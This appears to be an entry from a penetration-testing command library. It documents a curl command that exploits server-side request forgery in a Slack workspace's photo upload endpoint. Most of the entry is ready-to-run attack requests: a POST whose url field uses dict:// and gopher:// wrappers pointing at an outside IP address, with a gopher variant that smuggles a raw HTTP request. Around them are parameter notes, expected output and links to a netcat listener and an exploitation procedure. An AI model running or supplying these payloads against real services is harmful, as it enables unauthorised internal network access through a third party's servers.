---
id: cmd-curl-ssrf-slack
data: >-
  curl -X POST 'https://whitehataudit.slack.com/account/photo' -H 'Referer:
  https://whitehataudit.slack.com/account/photo?url=http://95.211.198.76:5555/picture-54679.jpg'
  --data-raw
  'crumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85'
  -b 'cookies_here'
tags:
  - ssrf
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.439Z'
verified: false
validated: true
submitted: true
---
# curl-send-ssrf-request

## Command

```bash
curl -X POST 'https://whitehataudit.slack.com/account/photo' \
  -H 'Referer: https://whitehataudit.slack.com/account/photo?url=http://95.211.198.76:5555/picture-54679.jpg' \
  --data-raw 'crumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85' \
  -b 'cookies_here'
```

## Description

Sends a POST request to Slack's photo upload endpoint with a malicious URL parameter to trigger SSRF using protocol wrappers. Include authentication cookies for valid session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Referer: ...'` | Sets referer header with HTTP URL variant | Yes |
| `--data-raw '...'` | POST body with crumb, crop, url (malicious), cropbox | Yes |
| `-b 'cookies_here'` | Authentication cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.slack.com/account/photo' --data-raw 'url=dict://attacker-ip:port/path'
```

### Advanced Usage

Vary 'url' for protocols: replace 'dict://' with 'gopher://', etc.

```bash
curl -X POST 'https://whitehataudit.slack.com/account/photo' --data-raw 'url=gopher://95.211.198.76:6655/!GET /path HTTP/1.1\r\nHost: 95.211.198.76\r\n\r\n'
```

## Expected Output

HTTP 200 OK or redirect response from Slack; SSRF triggers backend fetch without client error.

## Related

- [[commands/nc-listen-verbose]]
- [[procedures/Send-Malicious-POST-Request-for-SSRF-Exploitation]]
